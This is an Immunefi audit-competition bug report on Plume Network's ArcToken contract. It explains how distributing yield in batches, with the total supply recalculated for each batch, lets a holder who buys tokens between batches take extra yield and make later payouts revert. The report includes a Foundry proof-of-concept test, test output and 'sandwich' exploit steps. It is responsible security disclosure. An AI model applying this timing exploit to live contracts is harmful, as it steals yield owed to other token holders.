# 49787 sc high batched yield distribution doesn t account for transfers purchases between batches

**Submitted on Jul 19th 2025 at 13:31:56 UTC by @Vanshika for** [**Attackathon | Plume Network**](https://immunefi.com/audit-competition/plume-network-attackathon)

* Report ID: #49787
* Report Type: Smart Contract
* Report severity: High
* Target: <https://github.com/immunefi-team/attackathon-plume-network/blob/main/arc/src/ArcToken.sol>
* Impacts:
  * Theft of unclaimed yield

## Description

### Brief / Intro

`ArcToken` distributes yield in batches when the number of token holders is too high to fit in a single transaction. Any change in user balances occurring between separate batches can cause incorrect accounting or transaction reverts, potentially leading to loss or theft of yield.

### Vulnerability Details

`ArcToken::distributeYieldWithLimit()` distributes yield across a range of token holders per call. `holders` is an enumerable set of addresses among whom the `totalAmount` is distributed. When distributing in batches:

* The contract receives the `totalAmount` to distribute only on the first batch (when `startIndex == 0`).
* Each batch recalculates the `effectiveTotalSupply` as the sum of ArcToken balances for eligible yield recipients for that batch.
* Because `effectiveTotalSupply` is recalculated per batch, it can change between batches if balances are modified (transfers, purchases, sells).
* A user who increases their balance immediately before an early batch receives a disproportionate share of that batch. They can then sell tokens so later batches find less yield remaining and may revert or leave holders unpaid.

Yield for a holder is calculated as:

```
uint256 share = (totalAmount * holderBalance) / effectiveTotalSupply;
```

Since `effectiveTotalSupply` can vary between batches, this leads to incorrect share allocations and potential reverts (or theft of yield).

### Impact Details

* High likelihood of accidental accounting errors and transaction reverts during normal use.
* Malicious actors can exploit timing between batches to inflate yield for early batches and cause DoS or theft for later batches.

## Proof of Concept

<details>

<summary>PoC test (click to expand)</summary>

Copy the following test into `ArcToken.t.sol` and run with:

forge test --mt test\_batchDistribution --via-ir

```
    function test_batchDistribution() public {
        // set-up
        address david = makeAddr("david");
        address ethan = makeAddr("ethan");
        token.transfer(bob, 100e18);
        token.transfer(charlie, 100e18);
        token.transfer(david, 100e18);
        token.transfer(ethan, 100e18);

        yieldBlacklistModule.addToBlacklist(owner); // owner balance not counted in effective balance
        yieldToken.approve(address(token), YIELD_AMOUNT);
        uint256 initialBalanceOwner = yieldToken.balanceOf(owner);

        token.distributeYieldWithLimit(YIELD_AMOUNT, 0, 3); //batch1

        // checks
        assertEq(yieldToken.balanceOf(owner), initialBalanceOwner - YIELD_AMOUNT, "owner has been blacklisted"); 
        // effectiveTotalSupply = 500e18 which will be split between 5 people. because owner balance does not count. 
        assertEq(yieldToken.balanceOf(alice), YIELD_AMOUNT / 5, ""); 
        assertEq(yieldToken.balanceOf(bob), YIELD_AMOUNT / 5, "");
        assertEq(yieldToken.balanceOf(charlie), 0, ""); // not part of this batch

        // token.distributeYieldWithLimit(YIELD_AMOUNT, 3, 3); // batch2 << not running this immediately.
        // BUG = what could be sandwiched between batches.

        token.transfer(charlie, 300e18);
        // new effectiveTokenSupply = 800e18. charlie gets 400e18 * YIELD_AMOUNT / 800e18
        token.distributeYieldWithLimit(YIELD_AMOUNT, 3, 1); // batch2
        // Keeping maxHolders to 1 because YIELD_AMOUNT leftover is insufficient to cover all remaining transfers and will revert <<< BUG

        assertEq(yieldToken.balanceOf(charlie), 400e18 * YIELD_AMOUNT / 800e18, ""); // went from 1/5 of YIELD_AMOUNT to 1/2
        // assertEq(yieldToken.balanceOf(david), YIELD_AMOUNT / 8, ""); // went from 1/5 of YIELD_AMOUNT to 1/8. There's not enough balance to cover that.
        // assertEq(yieldToken.balanceOf(ethan), YIELD_AMOUNT / 8, ""); // INSUFFICIENT BALANCE
    }
```

Expected Result if maxHolders in batch2 = 1:

```
Ran 1 test for test/ArcToken.t.sol:ArcTokenTest
[PASS] test_batchDistribution() (gas: 599048)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.41ms (410.18µs CPU time)

Ran 1 test suite in 4.30ms (1.41ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

Expected result if you test with maxHolders = 2 or 3 for batch2: (uncomment david's assert statement)

```
Ran 1 test suite in 41.62ms (6.49ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ArcToken.t.sol:ArcTokenTest
[FAIL: ERC20InsufficientBalance(0xc7183455a4C133Ae270771860664b6B7ec320bB1, 100000000000000000000 [1e20], 125000000000000000000 [1.25e20])] test_batchDistribution() (gas: 626814)

Encountered a total of 1 failing tests, 0 tests succeeded
```

</details>

## Reproduction / Steps

{% stepper %}
{% step %}

### Setup

* Transfer tokens to multiple holders (alice, bob, charlie, david, ethan).
* Blacklist owner from yield calculation (so owner balance is excluded from `effectiveTotalSupply`).
* Approve `yieldToken` allowance for the contract.
* Call `distributeYieldWithLimit(YIELD_AMOUNT, 0, 3)` to distribute the first batch.
  {% endstep %}

{% step %}

### Sandwich / Exploit

* Before running subsequent batch calls, an attacker increases their ArcToken balance (e.g., charlie receives more tokens).
* The attacker gets a larger share of the yield calculated in a prior or current batch due to increased holderBalance and a recalculated (smaller or larger) `effectiveTotalSupply`.
* The attacker then sells tokens, reducing the remaining supply and causing later batches to find insufficient yield (leading to incorrect payments or reverts).
  {% endstep %}

{% step %}

### Result

* Early batches overpay the attacker.
* Later batches run out of funds or revert, causing yield loss or failed distributions for other holders.
  {% endstep %}
  {% endstepper %}

## Notes

* The core issue is reliance on a per-batch recalculation of `effectiveTotalSupply` while the total distributed amount is provided only once at the start. Ensuring a fixed denominator across all batches (or transferring funds for each batch separately) is necessary to prevent this class of issue.
